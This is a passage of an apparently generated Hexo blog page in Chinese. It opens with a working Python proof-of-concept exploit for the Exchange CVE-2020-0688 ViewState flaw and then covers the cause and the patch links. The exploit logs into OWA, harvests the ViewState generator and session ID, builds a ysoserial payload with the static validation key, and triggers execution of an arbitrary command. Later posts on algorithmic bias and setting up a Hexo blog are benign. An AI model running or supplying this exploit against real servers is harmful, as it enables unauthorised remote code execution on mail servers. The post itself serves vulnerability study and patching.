class="line">	tmp = urlparse(url)</span><br><span class="line">	base_url = <span class="string">"&#123;&#125;://&#123;&#125;"</span>.format(tmp.scheme, tmp.netloc)</span><br><span class="line">	paramsPost = &#123;<span class="string">"password"</span>: <span class="string">""</span>+pwd+<span class="string">""</span>, <span class="string">"isUtf8"</span>: <span class="string">"1"</span>, <span class="string">"passwordText"</span>: <span class="string">""</span>, <span class="string">"trusted"</span>: <span class="string">"4"</span>,</span><br><span class="line">				<span class="string">"destination"</span>: <span class="string">""</span>+url+<span class="string">""</span>, <span class="string">"flags"</span>: <span class="string">"4"</span>, <span class="string">"forcedownlevel"</span>: <span class="string">"0"</span>, <span class="string">"username"</span>: <span class="string">""</span>+user+<span class="string">""</span>&#125;</span><br><span class="line">	headers = &#123;<span class="string">"Accept"</span>: <span class="string">"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8"</span>, <span class="string">"Upgrade-Insecure-Requests"</span>: <span class="string">"1"</span>,</span><br><span class="line">            <span class="string">"User-Agent"</span>: <span class="string">"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:73.0) Gecko/20100101 Firefox/73.0"</span>, <span class="string">"Connection"</span>: <span class="string">"close"</span>, <span class="string">"Accept-Language"</span>: <span class="string">"en-US,en;q=0.5"</span>, <span class="string">"Accept-Encoding"</span>: <span class="string">"gzip, deflate"</span>, <span class="string">"Content-Type"</span>: <span class="string">"application/x-www-form-urlencoded"</span>, <span class="string">"Cookie"</span>: <span class="string">"PrivateComputer=true; PBack=0"</span>&#125;</span><br><span class="line">	cookies = &#123;<span class="string">"PBack"</span>: <span class="string">"0"</span>, <span class="string">"PrivateComputer"</span>: <span class="string">"true"</span>&#125;</span><br><span class="line">	login_url = base_url + <span class="string">'/owa/auth.owa'</span></span><br><span class="line">	print(<span class="string">"[+] Login url: &#123;&#125;"</span>.format(login_url))</span><br><span class="line">	<span class="keyword">try</span>:</span><br><span class="line">		login = session.post(login_url, data=paramsPost,</span><br><span class="line">                          headers=headers, verify=<span class="literal">False</span>, timeout=<span class="number">15</span>)</span><br><span class="line">		print(<span class="string">"[*] Status code:   %i"</span> % login.status_code)</span><br><span class="line">		<span class="keyword">if</span> <span class="string">"reason="</span> <span class="keyword">in</span> login.text <span class="keyword">or</span> <span class="string">"reason="</span> <span class="keyword">in</span> login.url <span class="keyword">and</span> <span class="string">"owaLoading"</span> <span class="keyword">in</span> login.text:</span><br><span class="line">			print(<span class="string">"[!] Login Incorrect, please try again with a different account.."</span>)</span><br><span class="line">			sys.exit(<span class="number">1</span>)</span><br><span class="line">		<span class="comment">#print(str(response.text))</span></span><br><span class="line">	<span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">		print(<span class="string">"[!] login error , error: &#123;&#125;"</span>.format(e))</span><br><span class="line">		sys.exit(<span class="number">1</span>)</span><br><span class="line">	print(<span class="string">"[+] Login successfully! "</span>)</span><br><span class="line">	<span class="keyword">try</span>:</span><br><span class="line">		print(<span class="string">"[*] Tring to get __VIEWSTATEGENERATOR..."</span>)</span><br><span class="line">		target_url = <span class="string">"&#123;&#125;/ecp/default.aspx"</span>.format(base_url)</span><br><span class="line">		new_response = session.get(target_url, verify=<span class="literal">False</span>, timeout=<span class="number">15</span>)</span><br><span class="line">		view = re.compile(</span><br><span class="line">			<span class="string">'id="__VIEWSTATEGENERATOR" value="(.+?)"'</span>).findall(str(new_response.text))[<span class="number">0</span>]</span><br><span class="line">		print(<span class="string">"[+] Done! __VIEWSTATEGENERATOR:&#123;&#125;"</span>.format(view))</span><br><span class="line">	<span class="keyword">except</span>:</span><br><span class="line">		view = <span class="string">"B97B4E27"</span></span><br><span class="line">		print(<span class="string">"[*] Can't get __VIEWSTATEGENERATOR, use default value: &#123;&#125;"</span>.format(view))</span><br><span class="line">	<span class="keyword">try</span>:</span><br><span class="line">		print(<span class="string">"[*] Tring to get ASP.NET_SessionId...."</span>)</span><br><span class="line">		key = session.cookies[<span class="string">'ASP.NET_SessionId'</span>]</span><br><span class="line">		print(<span class="string">"[+] Done!  ASP.NET_SessionId: &#123;&#125;"</span>.format(key))</span><br><span class="line">	<span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">		key = <span class="literal">None</span></span><br><span class="line">		print(<span class="string">"[!] Get ASP.NET_SessionId error, error: &#123;&#125; \n[*] Exit.."</span>.format(e)) </span><br><span class="line">	<span class="keyword">return</span> view, key, base_url</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">	parser = argparse.ArgumentParser()</span><br><span class="line">	parser.add_argument(<span class="string">"-s"</span>, <span class="string">"--server"</span>, required=<span class="literal">True</span>, help=<span class="string">"ECP Server URL Example: http://ip/owa"</span>)</span><br><span class="line">	parser.add_argument(<span class="string">"-u"</span>, <span class="string">"--user"</span>, required=<span class="literal">True</span>, help=<span class="string">"login account Example: domain\\user"</span>)</span><br><span class="line">	parser.add_argument(<span class="string">"-p"</span>, <span class="string">"--password"</span>, required=<span class="literal">True</span>, help=<span class="string">"Password"</span>)</span><br><span class="line">	parser.add_argument(<span class="string">"-c"</span>, <span class="string">"--cmd"</span>, help=<span class="string">"Command u want to execute"</span>, required=<span class="literal">True</span>)</span><br><span class="line">	args = parser.parse_args()</span><br><span class="line">	url = args.server</span><br><span class="line">	print(<span class="string">"[*] Start to exploit.."</span>)</span><br><span class="line">	user = args.user</span><br><span class="line">	pwd = args.password</span><br><span class="line">	command = args.cmd</span><br><span class="line">	view, key, base_url = get_value(url, user, pwd)</span><br><span class="line">	<span class="keyword">if</span> key <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">		sys.exit(<span class="number">1</span>)</span><br><span class="line">	print(<span class="string">"""\nysoserial.exe -p ViewState -g TextFormattingRunProperties -c "&#123;&#125;" --validationalg="SHA1" --validationkey="CB2721ABDAF8E9DC516D621D8B8BF13A2C9E8689A25303BF" --generator="&#123;&#125;" --viewstateuserkey="&#123;&#125;" --isdebug –islegacy"""</span>.format(command,view,key))</span><br><span class="line">	out_payload = input(<span class="string">'\n[*] Please input ysoserial payload:'</span>)</span><br><span class="line">	final_exp = <span class="string">"&#123;&#125;/ecp/default.aspx?__VIEWSTATEGENERATOR=&#123;&#125;&amp;__VIEWSTATE=&#123;&#125;"</span>.format(</span><br><span class="line">		base_url, view, quote(out_payload))</span><br><span class="line">	print(<span class="string">"\n[+] Exp url: &#123;&#125;"</span>.format(final_exp))</span><br><span class="line">	print(<span class="string">"\n[*] Trigger payload.."</span>)</span><br><span class="line">	status = session.get(final_exp,verify=<span class="literal">False</span>)</span><br><span class="line">	print(status.status_code)</span><br><span class="line"></span><br><span class="line">session = requests.Session()</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">	main()</span><br></pre></td></tr></table></figure>
+
+<h3 id="运行结果"><a href="#运行结果" class="headerlink" title="运行结果"></a>运行结果</h3><p>如下图所示，我让靶机执行了相应指令：</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/21284845-41b2e6038e285e11.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="Screenshot 2020-03-06 01^%42^%44.png"></p>
+<h2 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a>原理分析</h2><p>我主要参考了绿盟科技发布的一篇文章：</p>
+<p><code>http://blog.nsfocus.net/cve-2020-0688-2/</code></p>
+<p>漏洞原因是Exchange服务器在安装时没有正确创建唯一的加密密钥。导致经过身份验证的攻击者可以通过Exchange默认开启的Web页面登录，具体来说，错误存在于 Exchange Control Panel（ECP）组件中。所有的Microsoft Exchange Server在安装后，web.config文件中都拥有相同的validationKey和decryptionKey。而这两个 Key 是用来保证 ViewState安全性的。ViewState 是ASP.NET Web应用以序列化格式存储在客户端上的服务端数据。客户端通过__VIEWSTATE 请求参数将这些数据返回给服务器。</p>
+<p><img src="http://blog.nsfocus.net/wp-content/uploads/2020/02/image-96-1024x144.png" alt="img"></p>
+<p>由于使用了静态密钥，经过身份验证的攻击者可以诱使服务器反序列化恶意制作的ViewState数据。借助YSoSerial.net，攻击者可以在服务器上Exchange Control Panel web应用程序的上下文中，以SYSTEM身份执行任意.NET代码。</p>
+<h2 id="防范方式："><a href="#防范方式：" class="headerlink" title="防范方式："></a>防范方式：</h2><p>微软官方已针对受支持的产品版本发布了安全补丁，建议受影响用户开启系统自动更新安装补丁进行防护。</p>
+<p>如需单独安装，官方提供的补丁下载地址如下。</p>
+<p><code>Microsoft Exchange Server 2010 Service Pack 3 Update Rollup 30：</code></p>
+<p><code>https://www.microsoft.com/zh-CN/download/details.aspx?id=100910</code></p>
+<p><code>Microsoft Exchange Server 2013 Cumulative Update 23：</code></p>
+<p><code>https://www.microsoft.com/zh-CN/download/details.aspx?id=100909</code></p>
+<p><code>Microsoft Exchange Server 2016 Cumulative Update 14：</code></p>
+<p><code>https://www.microsoft.com/zh-CN/download/details.aspx?id=100907</code></p>
+<p><code>Microsoft Exchange Server 2016 Cumulative Update 15：</code></p>
+<p><code>https://www.microsoft.com/zh-CN/download/details.aspx?id=100908</code></p>
+<p><code>Microsoft Exchange Server 2019 Cumulative Update 3：</code></p>
+<p><code>https://www.microsoft.com/en-us/download/details.aspx?id=100905</code></p>
+<p><code>Microsoft Exchange Server 2019 Cumulative Update 4：</code></p>
+<p><code>https://www.microsoft.com/zh-CN/download/details.aspx?id=100906</code></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2020/03/07/Poc%20of%20CVE-2020-0688/" data-id="ck7h5xson0001xsb3aejpgsyh" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-hello-world" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2020/03/07/hello-world/" class="article-date">
+  <time datetime="2020-03-07T04:54:58.618Z" itemprop="datePublished">2020-03-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/03/07/hello-world/">Hello World</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p>
+<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p>
+<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p>
+<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p>
+<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html" target="_blank" rel="noopener">Deployment</a></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2020/03/07/hello-world/" data-id="ck7h5xsoy0009xsb3evm2gp35" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-Algorithmic bias" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2020/02/26/Algorithmic%20bias/" class="article-date">
+  <time datetime="2020-02-26T12:22:40.000Z" itemprop="datePublished">2020-02-26</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/02/26/Algorithmic%20bias/">算法偏见</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="什么是算法偏见"><a href="#什么是算法偏见" class="headerlink" title="什么是算法偏见"></a>什么是算法偏见</h1><p>基于大数据的算法和决策已经渗透到我们日常生活的方方面面，成为个人理财、医疗、招聘、住房、教育和政策的重要工具。因此，询问这些算法是否可以基于性别、种族或健康状况等理由而具有歧视性是具有社会和伦理重要性的。事实证明，答案是肯定的:例如，最近针对在线广告的研究表明，高收入职位的广告呈现给男性的频率远高于呈现给女性的频率</p>
+<p>即使在算法开发者没有歧视意图的情况下，这种算法偏见仍然存在。有时可能是内在使用的数据源(软件做出的决定是建立在数据可以反映,甚至放大的结果历史歧视),但即使敏感属性压制从输入,一个训练有素的机器学习算法可能仍然歧视的基础上如此敏感的属性,因为数据中存在的相关性。这些考虑要求开发具有区分意识的数据挖掘系统。对于数据挖掘社区来说，这是一个新颖且具有挑战性的研究领域。本教程的目的是调查算法偏差，介绍其最常见的变体，并重点介绍为获得有效解决方案而开发的算法技术和关键思想。本教程涵盖了两种主要的补充方法:歧视发现算法和公平感知数据挖掘的歧视预防算法。最后，我们总结了未来研究的前景</p>
+<p>报告得出的结论是，大数据技术造成的社会危害远远超过对隐私的损害。它特别表示关切的是，即使在没有歧视意图的情况下，大数据所通知的决定也可能产生歧视性影响，进一步对已经处于不利地位的群体施加不那么有利的待遇。在数据挖掘社区,努力设计discrimination-conscious方法开发了两组解决方案:(1)歧视发现从数据库技术[13]和(2)歧视预防通过fairness-aware数据挖掘、开发数据挖掘系统是discrimination-conscious设计[8]。数据库中的歧视发现包括对大量历史决策记录中隐藏的歧视情况和实践的实际发现。数据挖掘中的歧视预防包括确保从数据集自动提取的数据挖掘模型不会导致歧视性决策，即使数据集本身对受保护的组有偏见。不同的歧视预防方法提出了考虑不同的数据挖掘算法,如naıve贝叶斯模型、逻辑回归、决策树、铰链损失,支持向量机,适应性增强,分类,和规则和模式挖掘。可以设想有三种防止歧视的方法:通过转换源数据进行预处理;将反歧视约束集成到算法设计中进行处理;通过修改数据挖掘模型的结果进行后处理。</p>
+<h2 id="算法偏见的产生"><a href="#算法偏见的产生" class="headerlink" title="算法偏见的产生"></a>算法偏见的产生</h2><h4 id="1-训练数据偏见Training-Data-Bias"><a href="#1-训练数据偏见Training-Data-Bias" class="headerlink" title="1.训练数据偏见Training Data Bias"></a>1.训练数据偏见Training Data Bias</h4><p>算法偏见的第一种可能性是用于算法训练或输入数据的偏差，因为开发人员通常不会公开用于训练自治系统的精确数据。如果我们只看到最终的学习模型或它的行为，那么我们甚至可能没有意识到，在使用算法达到预期目的时，使用了有偏差的数据。</p>
+<h4 id="2-算法偏重偏差-Algorithmic-Focus-Bias"><a href="#2-算法偏重偏差-Algorithmic-Focus-Bias" class="headerlink" title="2.算法偏重偏差 Algorithmic Focus Bias"></a>2.算法偏重偏差 Algorithmic Focus Bias</h4><p>故意不使用某些信息</p>
+<p>一个更中立的例子是，在某些决策类型中使用受法律保护的信息时，算法的关注可能会导致偏见。如果提供的输入变量在法律上不允许用于某些类型的预测或判断，那么在其他方面中立的学习算法可能会由于关注点有偏差而表现出算法偏差(相对于法律标准)。即使该算法在统计上是无偏的(假设训练数据无偏)，它也会偏离法律标准。也就是说，我们可以在两种类型的算法偏差之间进行强制选择:一种是通过使用违反法律标准的信息而与法律标准相关，另一种是通过忽略输入数据中的统计相关信息而与统计标准相关。</p>
+<h4 id="3-算法处理偏差-Algorithmic-Processing-Bias"><a href="#3-算法处理偏差-Algorithmic-Processing-Bias" class="headerlink" title="3.算法处理偏差 Algorithmic Processing Bias"></a>3.算法处理偏差 Algorithmic Processing Bias</h4><p>当算法本身以各种方式产生偏差时，就会产生第三种算法偏差。算法处理偏差最明显的例子是在算法中使用统计偏差估计量。</p>
+<h4 id="4-背景转移偏差-Transfer-Context-Bias"><a href="#4-背景转移偏差-Transfer-Context-Bias" class="headerlink" title="4.背景转移偏差 Transfer Context Bias"></a>4.背景转移偏差 Transfer Context Bias</h4><p>转移背景偏差，算法和自主系统的不恰当使用或部署</p>
+<h4 id="5-理解性偏差-Interpreter-Bias"><a href="#5-理解性偏差-Interpreter-Bias" class="headerlink" title="5.理解性偏差 Interpreter Bias"></a>5.理解性偏差 Interpreter Bias</h4><p>算法偏差的最后一个来源是用户对算法输出或功能的误解，或者是算法所在的更广泛的自治系统的误解。虽然这种偏差可以简单地描述为用户错误，但情况往往比这更复杂。特别是，解释偏差表示，即使在预期的操作范围内，算法产生的信息之间也不匹配;以及(ii)使用该输出的用户或系统的信息需求。</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2020/02/26/Algorithmic%20bias/" data-id="ck7h5xsoe0000xsb3buu4235o" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/algorithmic-bias/" rel="tag">algorithmic bias</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-How to embellish your blog" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2020/02/15/How%20to%20embellish%20your%20blog/" class="article-date">
+  <time datetime="2020-02-15T01:03:30.000Z" itemprop="datePublished">2020-02-15</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/02/15/How%20to%20embellish%20your%20blog/">如何美化自己的博客</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="0x01-美化博客的时机"><a href="#0x01-美化博客的时机" class="headerlink" title="0x01 美化博客的时机"></a>0x01 美化博客的时机</h1><p>当然是自己已经搭建完一个初步的博客之后，再进行一些个性化的设置。在这之前一定要做好备份，防止发生玄学错误结果原先的博客也用不了了。。。</p>
+<p>搭建博客的教程参见：</p>
+<p><a href="https://yueyuehuman.github.io/John_blog/2020/02/14/Github-pages-hexo-to-start-up-your-blog/" target="_blank" rel="noopener">https://yueyuehuman.github.io/John_blog/2020/02/14/Github-pages-hexo-to-start-up-your-blog/</a></p>
+<p>正式开始，首先在仓库中新建一个分支，我建的是hexo</p>
+<h1 id="0x02-冲鸭！（具体步骤）"><a href="#0x02-冲鸭！（具体步骤）" class="headerlink" title="0x02 冲鸭！（具体步骤）"></a>0x02 冲鸭！（具体步骤）</h1><h2 id="参考内容"><a href="#参考内容" class="headerlink" title="参考内容"></a>参考内容</h2><p>我参考的是知乎专栏一篇大神写的教程，很详细！</p>
+<p><a href="https://zhuanlan.zhihu.com/p/35668237" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/35668237</a></p>
+<h2 id="安装Node-js"><a href="#安装Node-js" class="headerlink" title="安装Node.js"></a>安装Node.js</h2><p>下载地址：<a href="https://nodejs.org/dist/v9.11.1/node-v9.11.1-x64.msi" target="_blank" rel="noopener">https://nodejs.org/dist/v9.11.1/node-v9.11.1-x64.msi</a></p>
+<p>作用就是提供一个基本的编译环境，如果成功安装之后，输入node -v 和npm -v 来查看版本号，顺便检查安装成功么得。</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/21284845-aa50584522f995fb.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
+<h2 id="安装Git"><a href="#安装Git" class="headerlink" title="安装Git"></a>安装Git</h2><p>下载地址：<a href="https://git-scm.com/download/win" target="_blank" rel="noopener">https://git-scm.com/download/win</a></p>
+<p>这就不用说了吧，git是最好用的分布式管理平台（没有之一！）Linus大神做得，管理github的项目非常之方便！</p>
+<p>所有的操作都可以一路next，直到最后一个选项选择Use Git from the Windows Command Prompt so that u can run git bash in cmd，然后git –version 查看一下是否安装成功</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/21284845-f7850fce3e33b53b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
+<h2 id="注册Github帐号"><a href="#注册Github帐号" class="headerlink" title="注册Github帐号"></a>注册Github帐号</h2><p><a href="https://github.com/" target="_blank" rel="noopener">https://github.com/</a></p>
+<p>世界上最大的同性♂交友网站，满足你的一切幻想……先注册帐号</p>
+<p>然后在右上角“+”处新建一个新的仓库，创建好仓库之后点进去，选择settings，下拉到Github Pages</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/21284845-5cb2ce5e683641ab.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
+<p><img src="https://upload-images.jianshu.io/upload_images/21284845-7e55576b59aac9b2.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
+<h2 id="安装设置Hexo"><a href="#安装设置Hexo" class="headerlink" title="安装设置Hexo"></a>安装设置Hexo</h2><p>首先在本地建立一个新的文件夹用以存放你的博客文件，比如我存的是 C:\ blog directory,我在虚拟机上只建立了一个盘，大家当然可以放在D、E、F……上</p>
+<p>在建立好文件夹之后，在文件夹位置右键打开Git Bash，在git bash 中输入：</p>
+<p>npm i hexo-cli -g<br>hexo -v</p>
+<p>来进行安装和检查是否安装好Hexo</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/21284845-ea56b348729df3fa.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
+<p>然后输入：</p>
+<p>hexo init<br>npm install </p>
+<p>安装需要的组件，安装完成之后，输入：</p>
+<p>hexo g</p>
+<p>即generate，用来生成文本</p>
+<p>hexo s</p>
+<p>即server，然后可以通过访问localhost：4000进行本地预览</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/21284845-ba15845ce4b79380.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
+<h2 id="本地远程连接Github"><a href="#本地远程连接Github" class="headerlink" title="本地远程连接Github"></a>本地远程连接Github</h2><p>输入如下命令，yueyuehuman是我的信息，改成自己的</p>
+<p>git config –global user.name “yueyuehuman”<br>git config –global user.email “<a href="mailto:yueyuehuman@gmail.com">yueyuehuman@gmail.com</a>“<br>ssh-keygen -t rsa -C “<a href="mailto:yueyuehuman@gmail.com">yueyuehuman@gmail.com</a>“</p>
+<p>然后访问Github Settings，选择SSH and GPG keys，把生成的密钥复制进去</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/21284845-40423c20d5205970.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
+<h3 id="小技巧："><a href="#小技巧：" class="headerlink" title="小技巧："></a>小技巧：</h3><p>很多人说在输入上述命令时候按照提示信息输入会报错：大概是：Can not find files or directory</p>
+<p>所以你在生成密钥时候不要管他提示，直接生成，然后在本地直接寻找./ssh/id_rsa.pub文件就行，然后用记事本打开文件，把所有的信息直接复制进去就行，之后输入：</p>
+<p>ssh -T <a href="mailto:git@github.com">git@github.com</a></p>
+<p>来测试一下是否成功，如果成功如下图：</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/21284845-38e640c88aef102b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
+<p>如果解决了上述错误，又出现什么cannot entry block，说明_config.yml文件中格式有误，这个是Hexo的一大bug！它解析语句时候必须遵循</p>
+<p>类型名+冒号+空格+参数，有些语句可能没空格，就会导致错误，因此需要进.yml文件中自己排查。</p>
+<p>然后打开博客根目录下_config.yml文件，修改最后一行配置，同样的改成自己的仓库名：</p>
+<p>deploy：<br>  type：git<br>  repository： <a href="https://github.com/yueyuehuman/John_blog" target="_blank" rel="noopener">https://github.com/yueyuehuman/John_blog</a><br>  branch：master</p>
+<h1 id="0x03-发布你的博客"><a href="#0x03-发布你的博客" class="headerlink" title="0x03 发布你的博客"></a>0x03 发布你的博客</h1><p>首先在博客根目录下右键打开git bash，安装一个扩展</p>
+<p>npm i hexo-deployer-git</p>
+<p>然后输入hexo new post “你的文章名”，新建一篇文章。</p>
+<p>然后打开C：\blog\source_posts<code>的目录，可以发现下面多了一个文件夹和一个</code>.md文件，一个用来存放你的图片等数据，另一个就是你的文章。</p>
+<p>编写完markdown文件后，根目录下输入hexo g生成静态网页，输入hexo d上传到github上。这时打开你的github.io主页就能看到发布的文章啦。</p>
+<h3 id="小提示："><a href="#小提示：" class="headerlink" title="小提示："></a>小提示：</h3><p>当然很多人发现可以上去了，但是不加载js和css之类的文件，太丑了，还是打开_config.yml</p>
+<p>在url和root中分别加入你的博客地址和仓库名，博客地址就是在githubpages中提示的，仓库名就是最上面的，格式一定严格按照下图，缺少引号或者前后的斜线都无法被识别，然后重新上传，效果如下：</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/21284845-8e06fa362a657659.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
+<p><img src="https://upload-images.jianshu.io/upload_images/21284845-beb6d900e63f17da.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2020/02/15/How%20to%20embellish%20your%20blog/" data-id="ck7h5xsos0003xsb3bdwbapij" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/blog/" rel="tag">blog</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-Github_pages+hexo to start up your blog" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2020/02/14/Github_pages+hexo%20to%20start%20up%20your%20blog/" class="article-date">
+  <time datetime="2020-02-13T20:18:30.000Z" itemprop="datePublished">2020-02-14</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/02/14/Github_pages+hexo%20to%20start%20up%20your%20blog/">利用Github_Pages和Hexo创建你的博客</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="0x01-为什么要建立自己的博客"><a href="#0x01-为什么要建立自己的博客" class="headerlink" title="0x01 为什么要建立自己的博客"></a>0x01 为什么要建立自己的博客</h1><p>作为一个程序猿，每天的大部分精力都是用来解决问题，很多问题可能花费了很长时间才得以解决，那么通过合理的方式记录下来最好了！有什么好的方式呢？CSDN、简书、知乎都提供了博客，但是一些博客有可能难以通过审核，自由度太低。而blogger之类的呢，你的解决方案无法被那些没法科学上网的人看见。通过Typora以Markdown形式在本地记录，又不方便。因此为什么不自己搭一个支持Markdown编写模式的博客呢？GithubPage+Hexo就是一个很好的解决方案。Github不多说了，世界上最大的同性交友网站，访客量很大。在该平台上维护的博客也相对稳定。由于自己不是前端大神，因此完全自己整界面也难，发现Hexo很符合我的taste，简约！</p>
+<h1 id="0x02-冲鸭！（具体步骤）"><a href="#0x02-冲鸭！（具体步骤）" class="headerlink" title="0x02 冲鸭！（具体步骤）"></a>0x02 冲鸭！（具体步骤）</h1><h2 id="参考内容"><a href="#参考内容" class="headerlink" title="参考内容"></a>参考内容</h2><p>我参考的是知乎专栏一篇大神写的教程，很详细！</p>
+<p><a href="https://zhuanlan.zhihu.com/p/35668237" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/35668237</a></p>
+<h2 id="安装Node-js"><a href="#安装Node-js" class="headerlink" title="安装Node.js"></a>安装Node.js</h2><p>下载地址：<a href="https://nodejs.org/dist/v9.11.1/node-v9.11.1-x64.msi" target="_blank" rel="noopener">https://nodejs.org/dist/v9.11.1/node-v9.11.1-x64.msi</a></p>
+<p>作用就是提供一个基本的编译环境，如果成功安装之后，输入node -v 和npm -v 来查看版本号，顺便检查安装成功么得。</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/21284845-aa50584522f995fb.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
+<h2 id="安装Git"><a href="#安装Git" class="headerlink" title="安装Git"></a>安装Git</h2><p>下载地址：<a href="https://git-scm.com/download/win" target="_blank" rel="noopener">https://git-scm.com/download/win</a></p>
+<p>这就不用说了吧，git是最好用的分布式管理平台（没有之一！）Linus大神做得，管理github的项目非常之方便！</p>
+<p>所有的操作都可以一路next，直到最后一个选项选择Use Git from the Windows Command Prompt so that u can run git bash in cmd，然后git –version 查看一下是否安装成功</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/21284845-f7850fce3e33b53b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
